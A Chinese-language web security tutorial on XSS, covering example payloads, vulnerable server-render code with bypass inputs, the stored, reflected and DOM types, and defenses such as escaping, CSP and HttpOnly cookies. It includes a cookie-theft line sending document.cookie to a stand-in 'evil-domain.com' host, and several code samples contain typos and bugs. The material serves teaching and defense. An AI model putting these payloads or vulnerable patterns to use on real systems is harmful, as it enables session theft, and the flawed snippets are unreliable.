---
nav:
  title: 计算机网络
  order: 4
group:
  title: WEB安全
  order: 5
title: XSS跨站脚本攻击
order: 2
---
# XSS跨站脚本攻击

xss攻击全称**跨站脚本攻击**(cross-site-scipting)，是一种代码注入攻击。攻击者利用网页开发时留下的漏洞，通过巧妙的方法在目标网站注入恶意脚本，使之在用户的游览器上运行，利用恶意的脚本，攻击者可以获取用户的敏感信息如Cookie、SessionID等，进而危害数据安全。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

而直接在用户的终端执行，恶意代码能直接获取用户的信息，或者利用这些信息冒充用户向网站发送攻击者定义的请求。

在部分情况下，由于输入的限制，注入的恶意脚本比较短，但可以通过引入外部的脚本，并由游览器执行，来完成比较复杂的攻击策略。

这里有一个问题：用户是通过哪种方法 **注入** 恶意脚本的呢？

不仅仅是业务上的 **用户的 UGC 内容** 可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：

- 来自用户的UGC信息
- 来自第三方的链接
- URL参数
- POST参数
- Referer （可能来自不可信的来源）
- Cookie （可能来自其他子域注入）

## 攻击方式

常见有效荷载：

- `<input onfocus=write('xss') autofocus>`
- `<img src onerror=alert('xss')>`
- `<svg onload=alert('xss') >`
- `<script>alert('xss')</script>`
- `<a href="javascript:alert('xss')">clickme</a>`

> XSS 荷载（XSS Payload）是指恶意植入且具有完成各种具体功能的恶意脚本。

### 标签拼接漏洞

服务端渲染代码：这里的 `input` 可能是客户端传递到服务端的数据

```js
// Server Code
function serverRender(input) {
  return '<div>' + input + '</div'>
}
```

攻击方法：破坏原来的 HTML 代码结构，让你写的代码生效

输入渲染的 `input` 变量为 `<script>alert(1)</script>`

输出渲染的 HTML 结构：`<div><script>alert(1)</script></div>`

这样你脚本内的 `alert(1)` 函数返回到前端渲染时就会被自动执行。

### 提前闭合标签

对于 `<textarea>` 这种原生会转换输入数据为字符串的标签，可以输入提前闭合标签绕过：

```
</textarea<script>alert(1)</script><textarea>
```

或者 `input`标签：

```js
// Server Code
function serverRender(input) {
  return '<input type="name" value=' + input + '">';
}
```

输入 `input` 变量：`"><script>alert(1)</script>`

输出渲染的 HTML 结构：`<input type="name" value=""><script>alert(1)">`

### 合法 HTML 转义漏洞

服务端渲染代码：将用户输入代码通过合法的 HTML 标签转义输出，返回给前端渲染

```js
// Server Code
function serverRender(input) {
  // HTML 的字符转义
  function escapeHtml(s) {
    return s
      .replace(/&/g, '&amp;')
      .replace(/'/g, '&#39;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&rt;')
      .replace(/\//g, '&#x2f');
  }

  const domainReg = /^https?:\/\/www\.example\.com/;

  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`;
  }

  return 'Invalid URL';
}
```

攻击方法：创建多级域名，子孙级域名中带 `.com`

```js
// 输入
const input = 'https://www.example.com.xss.com/foo.js';
```

输出渲染的 HTML DOM 结构：那么这个输入的 URL 就会被执行了

```html
<script src="http:&#x2f&#x2fwww.example.com.xss.com&#x2ffoo.js"></script>
```

HTML 转码在 URL 和 JavaScript 中都是无效的。

### 合法 JS 转义漏洞

```js
// Server Code
function serverRender(s) {
  // JavaScript 的字符转义
  function escapeJs(s) {
    return s
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/`/g, '\\`')
      .replace(/</g, '\\74')
      .replace(/>/g, '\\76')
      .replace(/\//g, '\\/')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/\f/g, '\\f')
      .replace(/\v/g, '\\v')
      .replace(/\0/g, '\\0');
  }

  const s = escapeJs(s);

  return `
<script type="application/javascript">
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')

  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
  `;
}
```

输出的 HTML DOM 结构：

```html
<script type="application/javascript">
  var url = 'javascript:console.log("")';
  var a = document.createElement('a');

  a.href = url;
  document.body.appendChild(a);
  a.click();
</script>
```

### 方法总结

- 在 HTML 中内嵌的文本那种，恶意内容以 `script` 标签形成注入
- 在内联的JavaScript中，拼接的数据突破原本的限制
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签
- 在标签的 `href`、`src` 等属性中，包含 `javascript:` 等可执行代码
- 在 `onload`、`onerror`、`onclick` 等事件中，注入不受控制代码

- 在 `style` 属性和标签汇总，包含类似 `background-image: url("javascript:...")` 的代码（新版本浏览器已经可以防范）
- 在 `style` 属性和标签中，包含类似 `expression(...)` 的 CSS 表达式代码（新版本浏览器已经可以防范）

## 分类

| 类型   | 存储区                      | 插入点         |
| ------ | --------------------------- | -------------- |
| 存储型 | 服务器数据库                | HTML           |
| 反射型 | URL                         | HTML           |
| DOM型  | 服务端数据库/客户端存储/URL | 前端JavaScript |

- 存储区：恶意代码存放的位置
- 插入点：由谁取得恶意代码，并插入到网页上

### 存储型

存储型的XSS工具又称为**持久性跨站点脚本攻击**。他一般发生在XSS攻击向量存储在网站的数据库，当一个页面被用户打开的时候执行。持久型的 XSS 相比非持久型 XSS 攻击危害性更大，容易造成 **蠕虫**，因为每当用户打开页面，查看内容时脚本将自动执行。

**攻击步骤**：

1. 攻击者将恶意代码提交到数据库
2. 用户打开目标网站的时候，网站的恶意代码从数据库取出，渲染到页面上。
3. 用户游览器解析后，其中恶意代码也被执行
4. 恶意代码可能窃取用户的数据，伪造用户的行为，让用户向服务器发起攻击等

**注意：**这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的编码转义。

### 反射性

反射性又称**非持久性跨站点脚本攻击**。漏洞产生的原因是攻击者注入的数据反映在请求响应中。

反射性XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问后，被植入的恶意代码会被游览器执行，从而达到攻击的目的。通过 URL 参数直接注入，然后在响应的数据中包含着危险的代码。

**攻击步骤**

1. 攻击者构造出特殊的URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作

```html
<div id="root"></div>
<script type="application/javascript">  // 假设这是请求返回的数据  const res = ['1', '2', '3', '<img src="1" onerror="console.log(windwo.localStorage)" />'];
  const root = document.querySelector('#root');
  res.forEach(item => {    const p = document.createElement('p');    p.innerHTML = item;    root.append(p);  });</script>
```

当数据返回后，`img` 标签会注入 HTML DOM 文档中，又因为 `src` 属性为无效的 URL 值，所以触发了 `onerror` 事件，从而执行了 `onerror` 定义的函数，这样便获取到了存储在客户端本地的 `localStorage` 信息。

#### 反射型XSS跟存储型XSS区别是？

存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

### DOM 型

简单来说，通过修改页面 DOM 节点形成的 XSS，称之为 DOM Based XSS。

👣 **攻击步骤：**

1. 攻击者构造出特殊的 URL，其中包含恶意代码
2. 用户打开带有恶意代码的 URL
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

## 防御策略

防护原则：

- 未雨绸缪
  - HTML 正文：HTML 实体字符转义
  - HTML 标签：HTML 实体字符转义
  - HTML `onxxx` 事件属性：JS 转义
  - URL：URL 转义
  - 用户富文本输入：后端白名单标签过滤，使用开源库（例如：[sanitize-html](https://www.npmjs.com/package/sanitize-html)），不要用正则过滤
- 配置安全协议头
  - Content-Security-Policy

### 输入过滤

在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？

答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。

那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 **安全的** 内容，返回给前端。这样是否可行呢？

我们举一个例子，一个正常的用户输入了 `5 < 7` 这个内容，在写入数据库前，被转义，变成了 `5 < 7`。

问题是：在提交阶段，我们并不确定内容要输出到哪里。

这里的 **并不确定内容要输出到哪里** 有两层含义：

- 用户的输入内容可能同时提供给 Web 前端和客户端，而一旦经过了 `escapeHTML()`，客户端显示的内容就变成了乱码 `5 < 7`。
- 在前端中，不同的位置所需的编码也不同。

当 `5 < 7` 作为 HTML 拼接页面时，可以正常显示：

```html
<div title="comment">5 &lt; 7</div>
```

当 `5 < 7` 通过 AJAX 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、`alert` 等。

所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。

输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。

### 纯前端渲染

预防攻击类型：`存储型 XSS` 和 `反射型 XSS`。

纯前端渲染的过程：

1. 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
2. 然后浏览器执行 HTML 中的 JavaScript。
3. JavaScript 通过 AJAX 加载业务数据，调用 DOM API 更新到页面上。

在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本 `.innerText`，还是属性 `.setAttribute`，还是样式 `.style` 等等。如此，浏览器不会被轻易地被欺骗，执行预期外的代码。

但纯前端渲染还需注意避免 DOM 型 XSS 漏洞，例如 `onload` 事件和 `href` 中的 `javascript:xxx` 等。

在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。

### 转义HTML

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 `doT.js`、`ejs`、`FreeMarker` 等，对于 HTML 转义通常只有一个规则，就是把 `& < > " ' /` 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：

| XSS 安全漏洞      | 简单转义是否有防护作用 |
| ----------------- | ---------------------- |
| HTML 标签文字内容 | 有                     |
| HTML 属性值       | 有                     |
| CSS 内联样式      | 无                     |
| 内联 JavaScript   | 无                     |
| 内联 JSON         | 无                     |
| 跳转链接          | 无                     |

所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。

### 禁止执行不可信的数据

DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。

如果用 Vue / React 技术栈，并且不使用 `v-html` / `dangerouslySetInnerHTML` 功能，就在前端 `render` 渲染阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。

以下方式都能把字符串作为代码运行：

- DOM 中的内联事件监听器：如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等
- HTML DOM 标签属性：`<a>` 标签的 `href` 属性
- JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等

如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。

### 內容安全策略

**内容安全策略**（Content Security Policy，简称 CSP）是一种 **可信白名单** 作机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。

**启用 CSP 方式**

1. 设置 HTTP 头信息的 Content-Security-Policy 字段

```http
content-security-policy: default-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src 'unsafe-inline' 'unsafe-eval' https:; style-src 'unsafe-inline' https:;
```

1. 通过网页 `<meta>` 标签

```html
<!-- 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) -->
<meta http-equiv="Content-Security-Policy" content="efault-src 'self'" />

<!-- 一个网站管理者允许内容来自信任的域名及其子域名 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self' *.trusted.com" />

<!-- 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者（获得），所有脚本必须从特定主机服务器获取可信的代码。 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com"
/>

<!-- 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src https://onlinebanking.jumbobank.com"
/>

<!--  一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容（从任意位置加载）。 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self' *.mailsite.com; img-src *" />
```

启用后，不符合 CSP 的外部资源就会被阻止加载。

严格的 CSP 在 XSS 的防范中可以起到下列的作用：

- 禁止加载外域代码，防止复杂的攻击逻辑
- 禁止外域提交，网站被攻击后，用户的数据不会泄漏到外域
- 禁止内联脚本执行（规则较严格，目前发现 Github 使用）
- 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）
- 合理使用上报可以及时发现 XSS，利于尽快修复问题

HTTP COOKIES

### HTTPOnly Cookie

防止JS访问Cookie

窃取网页 Cookie 的示例：

```js
new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
```

使用 HttpOnly Cookie 将重要的 Cookie 标记为 `http-only`，这样的话当浏览器向 Web 服务器发起请求的时就会带上 Cookie 字段，但是在 JavaScript 脚本中却不能访问这个 Cookie，这样就避免了 XSS 攻击利用 JavaScript 的 `document.cookie` 获取 Cookie。

在 Koa 中设置 Cookie `httpOnly` 属性：

---

**参考文章**：

- [XSS](https://tsejx.github.io/javascript-guidebook/computer-networks/web-security/xss)
- [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)